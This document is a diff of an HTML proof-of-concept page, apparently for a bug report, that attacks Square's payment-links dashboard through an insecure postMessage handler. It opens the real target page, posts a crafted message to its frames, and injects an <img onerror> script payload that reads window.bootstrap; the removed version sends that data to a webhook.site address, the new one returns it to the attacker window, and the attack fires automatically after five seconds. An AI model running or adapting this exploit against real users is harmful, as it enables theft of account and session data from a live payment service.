@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>postMessage PoC with Button</title>
+  <title>PoC - Bootstrap Leak via postMessage</title>
 </head>
 <body>
   <button onclick="sendPayload()">Send Payload</button>
 
   <script>
-    // Open the target window
-    var w = window.open('https://app.squareup.com/dashboard/payment-links/new');
+    // Open the Square dashboard in a new window
+    const w = window.open('https://app.squareup.com/dashboard/payment-links/new');
 
-    // Your payload object
+    // Payload that gets injected into the target window via postMessage
     const payload = {
       name: 'LINK_PREVIEW',
       data: {
@@ -40,7 +40,10 @@
               item_data: {
                 name: 'HACKED',
                 description_html: '',
-                description: '<img src=x onerror="(function(){let i=document.createElement(\'img\');i.src=\'https://webhook.site/15b86806-2167-4883-8098-97fd962682df?b=\'+encodeURIComponent(JSON.stringify(window.bootstrap));document.body.appendChild(i)})()">',
+                description: `<img src=x onerror="(function(){
+                  const data = JSON.stringify(window.bootstrap);
+                  window.opener.postMessage({leaked: data}, '*');
+                })()">`,
                 variations: [
                   {
                     type: 'ITEM_VARIATION',
@@ -63,25 +66,31 @@
       }
     };
 
-    // Function to send the payload (can be used by setTimeout or button)
+    // Send the payload via postMessage
     function sendPayload() {
       if (!w || w.closed) {
         alert("Target window is not open.");
         return;
       }
 
-      for (var i = 0; i < 10; i++) {
+      for (let i = 0; i < 10; i++) {
         try {
           w.frames[i].postMessage(payload, '*');
-        } catch (e) {
-          // ignore errors for non-existing frames
-        }
+        } catch (e) {}
       }
 
       console.log('Payload sent');
     }
 
-    // Automatically send after 5 seconds
+    // Receive the data back from the target window
+    window.addEventListener('message', event => {
+      if (event.data && event.data.leaked) {
+        console.log('[✓] Received window.bootstrap from target:', JSON.parse(event.data.leaked));
+        alert('Got bootstrap data! Check console.');
+      }
+    });
+
+    // Automatically send payload after 5 seconds
     setTimeout(sendPayload, 5000);
   </script>
 </body>
